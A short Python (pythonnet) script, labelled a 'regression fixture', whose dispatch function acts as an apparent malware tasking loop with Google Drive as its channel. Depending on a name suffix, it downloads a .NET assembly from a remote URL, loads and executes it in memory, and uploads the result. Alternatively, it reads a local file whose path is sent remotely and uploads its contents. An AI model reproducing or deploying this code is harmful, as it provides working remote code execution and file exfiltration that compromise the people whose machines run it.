import json
import sys
import clr
from System import Array, Byte, Object, String
from System.IO import File
from System.Net import WebClient
from System.Reflection import Assembly

# Source-only regression fixture: caller supplies real provider listing/content URLs.
# The opaque suffix values and managed entry-point names deliberately differ from BlackX.
def dispatch(name, content_url, result_url):
    client = WebClient()
    api_root = "https://www.googleapis.com/drive/v3/files/"
    if name.endswith("0xA1"):
        result = Assembly.Load(client.DownloadData(content_url)).GetType("Extensions.Entry").GetMethod("Execute").Invoke(None, Array[Object]([Array[String](sys.argv)]))
        client.UploadString(result_url, "PUT", str(result))
    elif name.endswith("0xB3"):
        client.UploadData(result_url, "PUT", File.ReadAllBytes(client.DownloadString(content_url)))
    return client.DownloadString(api_root + "items")
